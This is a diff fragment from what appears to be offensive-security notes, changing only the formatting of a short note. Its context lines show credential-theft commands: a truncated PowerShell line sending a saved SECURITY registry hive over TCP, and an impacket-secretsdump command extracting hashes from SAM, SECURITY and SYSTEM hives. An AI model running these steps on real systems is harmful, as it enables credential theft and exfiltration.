@@ -92,5 +92,6 @@ $port = 4446; $filePath = "C:\users\public\music\security.save"; SendOverTcp "$s
 impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 ```
 
-> **Note**: Security may not be must?
-
+::: info Note
+Security may not be must?
+:::
